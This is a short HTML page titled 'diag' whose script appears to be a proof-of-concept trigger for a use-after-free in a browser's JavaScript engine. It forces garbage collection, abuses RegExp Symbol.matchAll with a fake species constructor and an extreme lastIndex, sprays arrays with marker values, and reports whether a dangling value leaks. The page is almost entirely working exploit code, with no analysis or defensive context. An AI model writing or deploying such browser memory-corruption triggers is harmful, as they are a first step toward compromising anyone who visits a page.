<!doctype html><meta charset=utf-8><title>diag</title>
<body><pre id="r">loading</pre></body>
<script>
function out(m){ document.getElementById('r').textContent += '\n'+m; }
const c=new Float64Array(1), u=new Uint32Array(c.buffer);
function w2f(lo,hi){u[0]=lo>>>0;u[1]=hi>>>0;return c[0];}
function f2s(f){c[0]=f;return (u[1]>>>0).toString(16)+':'+(u[0]>>>0).toString(16);}
const MARK = w2f(0x13371337, 0x41414141);
const MARK2 = w2f(0xdeadbeef, 0xcafebabe);
const tick = () => new Promise(r => setTimeout(r, 0));
async function gcOnce(){
  const wr = new WeakRef({});
  let n = 0;
  while (wr.deref() !== undefined && n < 3000) {
    new Array(0x400).fill(1.1); n++;
    if ((n & 31) === 0) await tick();   // end job -> keep-alive expires
  }
  return n;
}
function spray(k){
  for (let i = 0; i < k; i++) { new Array(i & 1 ? 0x3ffb : 0x3fff).fill(i & 2 ? MARK : MARK2); }
}
async function main(){
  out('START');
  out('UA ' + navigator.userAgent);
  const samples = [];
  for (let round = 0; round < 3; round++) {
    try {
      const re = /(?:)/;
      const p1 = await gcOnce(); await gcOnce();      // promote re
      await gcOnce();                                  // align: fresh to-space
      const fake = { flags: "g", lastIndex: 1073741823,
        constructor: {[Symbol.species]: function() { return re }} };
      RegExp.prototype[Symbol.matchAll].call(fake, "").next();
      const t0 = String(re.lastIndex);
      await gcOnce(); await gcOnce();                  // two flips
      spray(2);
      const s1 = String(re.lastIndex);
      const s1hex = f2s(re.lastIndex);
      re.lastIndex = 0;                                // cleanup dangling field
      samples.push({t0, s1, s1hex});
      out('R'+round+' '+JSON.stringify(samples[round])+' gcN='+p1);
    } catch(e) { out('R'+round+' ERR '+(e&&e.message?e.message:e)); }
  }
  const uaf = samples.some(s => s.s1 !== '1073741824');
  out('VERDICT '+JSON.stringify({uaf})+' rounds='+samples.length);
  out('SURG_DONE');
}
main();
</script>
